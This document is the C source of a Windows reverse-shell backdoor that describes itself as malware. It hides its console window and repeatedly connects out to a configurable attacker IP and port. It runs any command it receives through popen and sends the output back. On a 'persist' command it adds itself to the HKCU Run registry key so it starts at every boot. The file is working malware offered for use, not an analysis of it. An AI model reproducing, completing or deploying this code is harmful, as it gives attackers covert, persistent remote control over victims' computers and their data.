#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p,size) (void) memset((p), 0, (size))

int sock;
//Run the program while booting the system
int bootRun(){
	char err[128]= "Failed while booting the malware";
	char suc[128]= "Created the persistence at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR  szPath[MAX_PATH];
	DWORD pathLen= 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); //GEt path of the malware
	if(pathLen == 0) {
		send(sock, err,sizeof(err),0);
		return -1;
	}
	HKEY NewVal;
	//Find the system registry
	// Main registry parts;CLLASSES_ROOT, CURRENT_USER, LOCAL_MACHINE, USERS, CURRENT_CONFIG
	if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&NewVal)!= ERROR_SUCCESS){
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	//Set path
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Malwared"), 0 ,REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		send(sock,err,sizeof(err),0);
		return -1;
	}
	//Return success message if everything worked well
	RegCloseKey(NewVal);
	send(sock, suc, sizeof(suc), 0);
	return 0;
}

//Function for cutting  necessary part of commands
char *
str_cut(char str[], int slice_from, int slice_to){
	if(str[0] == '\0'){
		return NULL;}
	char *buffer;
	size_t str_len, buffer_len;
	
	if(slice_to < 0 && slice_from > slice_to){
		str_len = strlen(str);
		if(abs(slice_to)>str_len-1){
			return NULL;}
		if (abs(slice_from)>str_len)
			slice_from = (-1) * str_len;
		buffer_len=slice_to - slice_from;
		str += (str_len + slice_from);
	}else if (slice_from >= 0 && slice_to > slice_from){
		str_len = strlen(str);
		if (slice_from > str_len -1)
			return NULL;
		buffer_len = slice_to - slice_from;
		str +=slice_from;
	}else {
	return NULL;
	}
	buffer = calloc(buffer_len, sizeof(char));
	strncpy(buffer, str, buffer_len);
	return buffer;
}

//Create shell and store the commands and resonses in buffers
void Shell(){
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while(1){
		jump:
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock,buffer,1024,0);
		//Close the socket and terminate Winsock 
		if(strncmp("q",buffer,1)==0){
			closesocket(sock);
			WSACleanup();
			exit(0);
		//Compare if the command is cd operation in the first three char of the buffer
		}else if(strncmp("cd ", buffer, 3)== 0){ 
			chdir(str_cut(buffer,3,100)); //Change directory by removing cd part.
		}else if(strncmp("persist", buffer, 7) == 0){
			bootRun(); //Run the malware in  every boot.	
		}else{
			FILE *fp;
			fp=popen(buffer, "r");
			while(fgets(container,1024,fp) != NULL){
				strcat(total_response, container);
			}
			send(sock,total_response, sizeof(total_response),0);
			fclose(fp);
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmfLine, int nCmdShow){
    //Hide the console by creating stealth mode
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
	
	ShowWindow(stealth, 0); // Hide the window
	
	//Connection
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP; // Point to the memory iders of var.
	WSADATA wsaData;
	
	ServIP = "192.168.1.30" ; // Change the IP address given as your attacker machine IP
	ServPort = 50005 ; // Select an empty port of the machine.
	
	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0 ){
		exit(1);
	}
	// Provide connection-oriented byte stream by using AF_INET address family
	sock=socket(AF_INET, SOCK_STREAM,0);

	memset(&ServAddr, 0 ,sizeof(ServAddr));
	ServAddr.sin_family=AF_INET;
	ServAddr.sin_addr.s_addr=inet_addr(ServIP);
	ServAddr.sin_port= htons(ServPort);

	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
		Sleep(10);
		goto start;
	}
	Shell();
}
